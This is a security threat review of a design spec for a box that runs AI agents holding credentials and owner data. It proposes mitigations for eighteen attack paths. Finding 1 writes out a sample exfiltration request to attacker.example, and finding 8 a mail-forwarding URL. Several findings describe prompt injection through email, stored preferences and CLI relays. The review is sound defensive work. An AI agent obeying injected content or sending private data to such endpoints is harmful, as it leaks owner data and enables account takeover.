# Security review 1: threat review of spec v0.11 (main @ e841b78)

**Scope:** the whole spec as an attack surface, plus the spike results merged so far (S3, S4, S7). PR #8 (UX review 1, not yet merged) is read as a pending input: where its proposals change a security property, the finding says so and leaves the call to the arbitrator and Mark.
**Method:** for each adversary below, follow every path to the assets and check whether a requirement stops it *structurally* (by construction), only *procedurally* (by a check that can be skipped or fooled), or not at all.
**Labels:** [Fact] verifiable · [Inference] reasoned, untested · [Risk] needs a spike · **[Decision]** Mark's call.
**Costs:** every proposal states its cost to **UX** (owner effort, prompts, friction) and to **potency** (what the agents can no longer do, or do slower), so the arbitrator can weigh it. "None" means none found, not none possible.

The paired spec diff (same PR) implements the findings marked **→ spec**. Findings marked **→ later** are recorded for a future run or spike.

---

## Threat model used

| Asset | Why it matters |
|---|---|
| Credentials (vault, executor sessions, provider keys) | Invariant C (CRED-1) |
| Authority (approvals, grants, pre-allowances) | Zero authority violations (§1) |
| Owner's private data (mail, files, recall index, journal) | Disclosure is an irreversible effect (REV-2) |
| Money and accounts | Irreversible external effects |
| Other installations and the public project | Supply chain (§11B, UPD-*) |

| Adversary | Starting position |
|---|---|
| **G** Injected or hostile guest | Root in an agent machine; controls everything a model reads (email, web pages, collaborator output) |
| **T** Text spoofer | Can send SMS/calls to the box showing the owner's number; does not receive replies |
| **S** SIM swapper | Receives the owner's texts and calls; can reply from the owner's number |
| **D** Drive thief | Has the drive, offline, unlimited time |
| **C** Card holder | Has seen or taken the Owner Card |
| **W** Wi-Fi neighbor | In radio range of the box's access point; may know the Wi-Fi password (a family member or guest) |
| **U** Upstream/supply chain | A malicious shared package, adapter, attestation, mirror, or a stolen signing key |

Trusted base as CRED-2 states it: host kernel, hypervisor, firmware, broker, executor sandboxes.

---

## Summary

| # | Finding | Severity | Adversary | Proposal | UX cost | Potency cost |
|---|---|---|---|---|---|---|
| 1 | Private data leaves through agent egress with no intent | **Critical** | G | Data labels on agent machines; private machines egress only to allowed destinations **[Decision]** → spec REV-5 | Low–Medium: an "allow this site?" prompt, pre-allowable | **Medium–High**: private-data tasks lose free browsing |
| 2 | A lost drive unlocks: the approval-code seed sits on it | **Critical** | D | Unknown-host unlock needs an off-drive high-entropy secret (card scan) **[Decision]** → spec CRED-8 | Low: one QR scan per new PC, owner is there anyway | Low: no remote unlock of a new PC |
| 3 | Adapter verbs are labels, not enforcement | **High** | G, U | Egress proxy enforces each operation's request shape → spec ADP-10 | None | Low: adapter authoring needs request shapes |
| 4 | Namespace-only sandboxes would put the host kernel inside the guest's reach | **High** | G | Agent machines and executors use a user-space kernel or a VM → spec ARC-5 | None | None (gVisor is already S3's pick) |
| 5 | One project signing key reaches every box within 24 h | **High** | U | Threshold-signed, expiring, no-downgrade update metadata (TUF) → spec UPD-8 | None | None; small delay for security fixes **[Decision]** |
| 6 | The Owner Card holds both factors of a tier-4 action | **High** | C, W | Paper grid moves to the detachable sheet; card secrets rotatable → spec §3.1, CH-4, REC-4 | Low: one more sheet to put away | None |
| 7 | SIM swap inside the unlock window reads private data by chat, including 2FA codes | **High** | S | Unlock only by code generator; texts never carry code- or secret-shaped strings → spec CH-19 | Low: owner reads a 2FA code on the local UI, not by text | Low |
| 8 | Credentialed browser can be steered off-site, and sites display secrets the vault doesn't know | **High** | G | Origin pinning; known-format secret redaction on executor output → spec CRED-10 | None | Low: cross-site flows need declaring |
| 9 | Local UI trusts anyone on the box's Wi-Fi | **Medium** | W | WPA3, client isolation, a local sign-in for anything beyond status → spec CH-7 | Low: one sign-in per device, remembered | None |
| 10 | "Recipient already exists" can be satisfied by auto-collected contacts; display names can lie | **Medium** | G | Owner-created and older than the hold; render canonical identifiers → spec CH-10 | Low: a few more high-tier prompts for new contacts | None |
| 11 | Code guessing has no stated limit | **Medium** | T | Code length, attempt limits, lockout → spec CH-18 | None in normal use | None |
| 12 | Injected content can become an "owner preference" | **Medium** | G | Preferences only from the authenticated owner channel; provenance on recall → spec CAP-3 | None | None |
| 13 | Spoken codes pass through an untrusted speech service | **Medium** | G | Codes on calls by keypad, decoded by the broker → spec CH-5 | Low: no spoken codes (conflicts with PR #8 CH-17) | None |
| 14 | Consumer CLI relays may interpret `/` or `!` input as commands | **Medium** [Risk] | G | S6 must prove relay input is inert → spec CRED-5 | None | None |
| 15 | Provider keys behind the proxy reach key-management and file-sharing endpoints | **Medium** | G | Model relays declare inference endpoints only → spec ADP-10 | None | Low |
| 16 | Trusted host = PC + drive stolen together restart unattended | Low (accepted) | D | State it; optional TPM+PIN **[Decision]** → later | PIN would cost every reboot | None |
| 17 | Evil maid on an unknown host (S7 surprise 1) | Low–Medium | D | Already a decision in S7's diff (HW-5a options) → later | — | — |
| 18 | Spoofed HELP/STATUS floods the owner with replies | Low | T | Rate-limit replies to unauthenticated control words → later (PR #8 CH-15 area) | None | None |

**Interactions with PR #8 (UX review 1).** These are the arbitrator's first cases:
- **D1, unlock N = 7 days.** Acceptable *if* findings 7 and 11 land: unlock only by code generator, outbound redaction, attempt limits. The residual is a SIM swapper reading private data by chat until the owner notices their phone has lost service. 24 h shrinks that window but does not close it.
- **D2, first PC trusted by default.** Fine for a PC the owner controls; finding 16 is the residual. No objection.
- **D3, Wi-Fi passes client internet through.** It invites other people onto the box's network. That is why finding 9 matters: with passthrough, Wi-Fi membership must stop being an authority signal.
- **CH-17, spoken codes.** Conflicts with finding 13. Proposal: keypad only for codes; speech stays for chat.

---

## Findings

### 1. Private data leaves through agent egress with no intent (REV-2, §4, CAP-2, CAP-3, CAP-4) — Critical
**Path.** An inbound email (CAP-4 starts work automatically, so zero clicks) carries an injection. The agent machine reads the owner's mail or queries the recall index for context, then makes an ordinary web request: `GET https://attacker.example/?d=<private data>`. Agent machines have "declared uncredentialed egress" (§4) and "uncredentialed browsing with full power" (CAP-2). No intent is created, so REV-2's "disclosing data" never fires. Reversibility is the trust boundary for *effects*; it says nothing about *information flow*, and disclosure can't be rolled back.
**Why the existing controls don't hold.** CRED-1 keeps credentials out of agent machines, so credentials are safe. Everything else the agent can read is not. A compiled skill or shared package that passed §11 (finding 3, U) has the same path.
**Proposal (REV-5).** Each agent machine carries a data label that only rises during its life:
- `public`: has seen only public input (web, public repos, the task text if the owner marks it public). Open uncredentialed egress, as today.
- `private`: has received owner data (mail, files, recall results, executor reads, owner chat, event-bus content). Outbound traffic goes only through the broker's egress proxy, to destinations on the task's allowlist: model providers, granted adapters, and domains the owner has pre-allowed. Any other destination is a disclosure intent (REV-2).
- Data flows freely from public to private. Private to public is a disclosure. Rollback to a pre-label snapshot, or a rebuild, resets the label.
- Fork and speculative parallelism (CAP-1) inherit the label.

**Residual [Inference].** A private machine can still leak through an allowed destination whose logs an attacker can read (a pastebin, an attacker's repo page, a URL shortener). The allowlist's security property is "the attacker cannot read what this destination receives". The default list should hold only model providers and granted adapters; suggested pre-allowances (CAP-6) exclude user-content hosts.
**UX cost.** Low–Medium. When a private task wants a new site, the owner gets one "allow docs.python.org for this task / always?" prompt. Pre-allowing common documentation sites removes most of them.
**Potency cost.** Medium–High, and the main tradeoff of this review. A task that mixes private data with open-web research has to split: a public helper machine browses, and the private machine pulls results in. The research query the private machine sends to that helper is itself a disclosure, so it runs as a templated, journaled intent or under a pre-allowance for search queries.
**[Decision] D4.** (a) Labels as above (recommended). (b) Keep open egress, add logging and canary detection (cheap, but detection after the fact; the data is gone). **Decision boundary:** whether "the agent can browse anywhere while holding my data" is worth a silent exfiltration path for any successful injection. Under (b), every inbound email is a potential data leak with no prompt at all.

### 2. A lost drive unlocks because the approval-code seed sits on it (CRED-8, ID-1, §17 open issue from PR #7) — Critical
**Path.** On an unknown host, the vault unlocks with an approval code (CRED-8). To check that code, the broker needs the code-generator seed, and before unlock the seed can only be on the drive in a form the box can read. A thief with the drive reads the seed, computes codes, and unlocks. Even if the seed were wrapped, a 6-digit code has 10^6 values, which is an instant offline search. So "a lost drive is ciphertext" is false today. [Inference from CRED-8 as written; confirmed by the open spec issue raised in the S7 review.]
**Proposal (CRED-8 rewrite).** An unknown-host unlock slot is wrapped only by a high-entropy secret that is not on the drive. The owner provides it on the box's local Wi-Fi page, never by text (CH-6). The approval-code seed and the paper-grid verifier live only inside the vault. Default: **scan the Owner Card's setup secret** on the local page, then confirm with an approval code (the code is a software check; the card is the cryptographic factor).
**Residual.** Drive plus card stolen together unlocks offline. That is already true of drive plus recovery sheet (REC-1), so the card should be kept away from the box, like the recovery sheet.
**UX cost.** Low. Moving the drive is a physical act, so the owner is already at the new PC; scanning the card replaces typing a code. The texted "reply with a code to unlock" flow for an unknown host goes away.
**Potency cost.** Low. Nobody can unlock a new PC remotely on the owner's behalf.
**[Decision] D5.** The off-drive factor: (a) card setup secret, scanned (recommended); (b) the recovery key, typed (about 30 characters, and routine use weakens its custody); (c) a memorized passphrase set during setup (adds a setup step; a weak one falls to an offline search despite a slow hash).

### 3. Adapter verbs are labels, not enforcement (ADP-1, ADP-2, ADP-8, CRED-5) — High
**Path.** An adapter maps an operation to a verb, and the class follows from the verb. But the adapter's code runs where the agent runs, and its HTTP requests go through the egress proxy, which injects the key. Nothing in the spec checks that a request sent under a `read` operation is in fact a read. A malicious public adapter (U), or a guest calling the proxy directly (G), can send `POST /messages` under a read label. ADP-8's demo-environment check sees only what the demo environment shows.
**Proposal (ADP-10).** Each declared operation also declares its request shape: host, method, and path template, and for single-endpoint APIs (GraphQL, JSON-RPC) the operation name and a body schema. The egress proxy injects a credential only into a request that matches a declared operation of a granted adapter, and checks that operation's class and intent before forwarding. Unmatched requests are denied and journaled. This turns the verb list into an enforced property at the one point a guest can't bypass, the same reasoning S4 used for spend.
**UX cost.** None.
**Potency cost.** Low. Adapter authors (agents, usually) must write request shapes, and GraphQL adapters need body schemas. Loop 1 can draft these from recorded traffic (LOOP-5).

### 4. Namespace-only sandboxes would put the host kernel in the guest's reach (CRED-2, §4, S3) — High
**Path.** CRED-2 counts the host kernel as trusted. A guest with root in a namespace-only sandbox (bubblewrap, plain containers) talks directly to that kernel, and local privilege escalation bugs in Linux are found many times a year [Fact: a recurring CVE class]. One working exploit reaches the broker's memory and the vault. The spec doesn't currently forbid that design; S3 measured bubblewrap as a candidate.
**Proposal (ARC-5).** Agent machines and credentialed executors run under a user-space kernel (gVisor) or hardware virtualization, never namespaces alone. This matches S3's recommendation (gVisor now, Firecracker if it measures better on the N95).
**UX cost.** None. **Potency cost.** None: S3 measured gVisor at about 15 MiB per machine more than bubblewrap, and its snapshots preserve the heap, which makes fork and rollback faster.

### 5. One project signing key reaches every box within 24 hours (UPD-2, UPD-5, §17 risk 6) — High
**Path.** UPD-5 auto-stages security fixes daily and applies them within about 24 h, with no soak. Whoever holds (or steals) the single offline project key can ship a "security fix" to every installation in a day. A mirror can also replay an old, correctly signed release with a known hole (DEP-4 allows any mirror), or withhold updates indefinitely (freeze).
**Proposal (UPD-8).** Reuse **The Update Framework (TUF)** rather than design update metadata [Fact: TUF is a CNCF-graduated specification with maintained Python, Go, and Rust implementations]. It gives:
- threshold signing (k of n maintainer keys), so one stolen key can't sign a release;
- key rotation and revocation without reinstalling;
- expiring timestamp metadata, so a frozen mirror is detected when online;
- no downgrade below the installed release, offline included.
Security fixes keep their fast path but need k-of-n signatures plus at least one independent attestation from the fast channel (OSS-8) before auto-staging.
**UX cost.** None. **Potency cost.** None for agents. Security fixes may arrive some hours later.
**[Decision] D6.** Whether security fixes wait for one fast-channel attestation (recommended: hours of delay, against fleet-wide compromise in 24 h from one key).

### 6. The Owner Card holds both factors of a tier-4 action (§3.1, CH-3, CH-4) — High
**Path.** Tier-4 actions (new grant, raise budget, add a trusted host) need "approval code + local confirmation". The card carries the Wi-Fi password (local presence) **and** the paper approval-code grid (the code). Someone who photographs the card and is in Wi-Fi range has both. Cards often live near the box, and kits can be intercepted in shipping before the owner ever sees them.
**Proposal.** The paper grid moves to the detachable sheet with the recovery key (§3.1, CH-4). The grid is challenge–response with single-use cells. **REC-4:** every card secret (Wi-Fi password, setup secret, grid, recovery key) can be rotated from the local UI as a tier-4 action, and setup offers it in one line ("print a fresh card if anyone else handled this kit").
**UX cost.** Low: one more thing to put away, which is the fallback the owner rarely uses. **Potency cost.** None.

### 7. A SIM swap inside the unlock window reads private data by chat (CH-3, CH-10, CRED-3; PR #8 CH-14 and D1) — High
**Path.** The session unlock is tied to the owner's number, not their SIM. A SIM swapper (S) inherits an unlocked session, with no code at all, until it lapses. They text "what's the latest code from my bank?" and the agent answers: CRED-3 makes 2FA codes in mail legitimate content, and replies to the owner aren't intents. That is a takeover of the owner's other accounts, not only the box. PR #8's CH-14 says "asks for a code" without a tier; if a texted low-tier code could unlock, the swapper could also re-unlock.
**Proposal (CH-19).**
- Session unlock requires a code-generator code or a grid cell, never a texted code.
- Outbound texts and speech never carry strings that match verification-code or known secret formats (fixed patterns, no inference, ARC-2). Such content is replaced with "shown on the local UI". This extends CRED-7 from vault values to things that look like secrets.
**UX cost.** Low. An owner who wants a 2FA code from their mail reads it on the local UI or in the mail app itself.
**Potency cost.** Low: some legitimate numeric strings (order numbers) get masked. The patterns err toward masking.
**Residual.** Inside the window, a swapper can still read ordinary private data by chat. That is the D1 tradeoff (see the interactions above).

### 8. The credentialed browser can be steered off-site, and sites show secrets the vault doesn't know (CRED-4, CRED-6, CRED-7, §17 risk 4) — High
**Path (a).** `navigate` takes any URL. A guest can drive a logged-in session to `https://bank.example/settings/forward?to=attacker` (a state-changing GET) or to any other origin. Path (b): many settings pages show tokens without a "reveal" step (webhook secrets, app passwords, recovery codes after generation, OAuth client secrets). `read DOM` and `screenshot` deliver them to the agent. CRED-7 redacts only values the vault holds; it doesn't know these.
**Proposal (CRED-10).**
- A credentialed executor stays on its account's declared origins (from its adapter). Any other origin opens in a separate uncredentialed context.
- Executor output (DOM text, accessibility snapshot) passes a fixed-pattern secret detector (known token formats plus high-entropy strings in secret-labelled fields), and matches are redacted, as in CRED-7. Screenshots of pages flagged that way are withheld.
- A5 adds a site-displayed canary: a test site that shows a canary token with no reveal step.
**UX cost.** None. **Potency cost.** Low. Cross-origin login flows (SSO, payment pages) must be declared in the adapter. Some legitimate high-entropy strings will be redacted.

### 9. The local UI trusts anyone on the box's Wi-Fi (CH-7, CH-8, CH-9; PR #8 ONB-5, D3) — Medium
**Path.** The live view of a credentialed browser, diffs, and files are shown to any device that joined the box's Wi-Fi. With passthrough (D3), the owner has every reason to share the password with family and guests. Under WPA2-PSK, anyone with the password who captures a handshake can decrypt other clients' traffic, and any client can ARP-spoof another.
**Proposal (CH-7).** WPA3-SAE by default (WPA2 only by owner opt-in); client-to-client isolation on the AP; anything beyond the setup and status pages needs a local sign-in (an approval code, remembered on that device for the CH-3 unlock period).
**UX cost.** Low: one code per device per unlock period. Some phones from before about 2019 lack WPA3 and need the opt-in. **Potency cost.** None.

### 10. "Recipient already exists" can be satisfied by auto-collected contacts, and display names can lie (CH-10, ADP-9) — Medium
**Path.** Many mail and accounting systems add contacts automatically (anyone you have replied to, any invoice sender). An attacker who once got into the owner's contacts is then a "verified existing recipient", and the send becomes low risk. A display name like "Mark's Accountant" in the fixed-wording request hides the real address.
**Proposal (CH-10 edit).** A recipient counts as existing only if the owner created it, or it has existed for longer than the owner's hold period (ADP-9's recent-edit hold). Approval texts render the canonical identifier (email address, phone number, last 4 of an account number), never a display name, after folding look-alike characters to plain GSM-7 (which PR #8's CH-12 already requires for the whole text).
**UX cost.** Low: sends to new contacts become high-tier for the hold period. **Potency cost.** None.

### 11. Code guessing has no stated limit (CH-3, CH-10) — Medium
**Path.** A spoofer (T) can text guesses at a pending request's code. Request IDs are short by design (PR #8 CH-12), so pending IDs are easy to enumerate.
**Proposal (CH-18).** Texted codes are at least 6 digits, single-use, and bound to one request or batch. Three wrong replies void that request. Five wrong codes in 24 h, of any kind, lock the low tier and require a code-generator code until the owner unlocks, and the owner is told. Grid cells are single-use.
**UX cost.** None in normal use; a lockout after the owner's own typos costs one code-generator code. **Potency cost.** None.

### 12. Injected content can become an "owner preference" (CAP-3, CAP-5) — Medium
**Path.** CAP-3 stores owner corrections as preferences. If the agent decides what counts as a correction, an email saying "Mark prefers invoices paid to account X" can persist as a preference and steer every later task: a stored injection that survives rollback, because the recall index is broker-owned.
**Proposal (CAP-3 edit).** Preferences are written only from the authenticated owner channel (owner texts, local UI), with that message as provenance. Recall results carry their source and reach agents marked as untrusted content, never as instructions. (S4 finding 6: OpenClaw already wraps tool results that way.)
**UX cost.** None. **Potency cost.** None.

### 13. Spoken codes pass through an untrusted speech service (CH-5; PR #8 CH-17) — Medium
**Path.** Local inference, speech included, is an "untrusted service" (§4) that guests also use. A guest that compromises it controls the transcript of the owner's call: it hears a code-generator code spoken for request A and can make the transcript say "approve B, <same code>". Speech also passes the code to models, which CH-6 forbids for secrets.
**Proposal (CH-5 edit).** On calls, codes and control words go by keypad (DTMF), decoded by the broker and never forwarded to guests or the speech service. Speech stays for conversation.
**UX cost.** Low: no hands-free code entry (driving). This reverses PR #8's "or spoken" in CH-17; arbitrator's call. **Potency cost.** None.

### 14. Consumer CLI relays may run commands from relay input (CRED-5, S6) — Medium [Risk]
**Path.** CRED-5 lets a provider CLI hold a consumer login token if its tools are disabled. But interactive CLIs often treat input that starts with `/` or `!` as their own commands (status, config, shell), which can print account details or run code next to the token. Injected text in the relayed prompt reaches that parser.
**Proposal (CRED-5 edit).** Relay input goes through the CLI's non-interactive mode, and S6 must show that slash, bang, and tool syntax in relayed input is inert, with a canary token that never appears in output.
**UX cost.** None. **Potency cost.** None; may rule out some CLIs, which then fall back to API keys (as CRED-5 already allows).

### 15. Provider keys behind the proxy reach key-management and sharing endpoints (CRED-5) — Medium
**Path.** The egress proxy injects a provider API key. Through it, a guest can call the provider's other endpoints: create or list keys, upload files to provider storage, create public shares, or change billing settings. Some providers expose these with the same key [Fact for several major APIs; varies].
**Proposal.** Covered by ADP-10: a model relay declares inference endpoints only; everything else at that provider is undeclared and denied.
**UX cost.** None. **Potency cost.** Low: provider file and batch features need explicit declaration.

### 16. A trusted host restarts unattended, even when stolen with the drive (CRED-8; PR #8 D2) — Low, accepted
A thief who takes the PC with the drive still in it gets a booted, unlocked broker. They still lack the owner channel and codes, so no authority. Getting at the vault key needs a running-memory or TPM-bus attack, which is real for discrete TPMs [Fact: published attacks on TPM-only BitLocker]. A PIN at boot would close it and break unattended restart.
**→ later, [Decision] D7:** record as accepted for MVP; offer TPM+PIN as an owner option.

### 17. Evil maid on an unknown host (HW-5, S7 surprise 1) — Low–Medium
Already analysed in S7 with options (a) accept, (b) per-PC MOK, (c) own shim. Finding 2 narrows it: with unlock on a card scan at the local page, a tampered drive can capture the card secret at the next unknown-host unlock. Option (a) plus telling the owner to treat a drive left unattended as suspect is proportionate for MVP. **→ later** (S7 decision).

### 18. Spoofed HELP and STATUS can flood the owner with replies — Low
Unauthenticated control words make the box text the owner. A spoofer can turn that into SMS spam and possibly carrier cost. **→ later:** rate-limit replies to unauthenticated control words, as part of PR #8's CH-15 pacing.

---

## What was checked and held

- **CRED-1 against the S4 guest:** model access with a placeholder key, no credential in the guest. Holds, given S4's note that OpenClaw's `secrets` tool and OAuth logins stay denied.
- **Spend runaway (S4 finding 2):** bounded at the broker's model egress, as S4 proposed. Holds once built.
- **Clean-room publication (OSS-1–5):** hints are enumerated values; the builder has no private access. The bridge holds against content leakage. Attestation Sybils (OSS-9) can delay or speed a release's soak but not sign one; with UPD-8, they can't ship code.
- **STOP spoofing:** the worst case is a pause, as CH-3 says.

## Decisions for Mark (and the arbitrator)

| ID | Question | Recommended | Tradeoff |
|---|---|---|---|
| D4 | Data labels on agent machines | (a) labels | Potency: private tasks browse only allowed sites; security: no silent exfiltration |
| D5 | Off-drive factor for unknown-host unlock | (a) card scan | UX: low; residual: drive and card stolen together |
| D6 | Security fixes wait for one fast-channel attestation | Yes | Hours of delay vs fleet-wide compromise from one key |
| D7 | TPM+PIN option on trusted hosts | Offer, off by default | Unattended restart vs stolen PC with drive |
| D1, D3 (PR #8) | Unlock period; Wi-Fi passthrough | Acceptable with findings 7, 9, 11 | See "Interactions with PR #8" |

## Next run
Read what changed on `main` since e841b78 (SPEC.md, merged PRs, spike results). Priority checks: whether PR #8 merged and how D1/D3/CH-17 were settled; S5 (credentialed browser) and S6 (CLI relay) results against findings 8 and 14; the broker's first code (ARC-1/2, ADP-10).
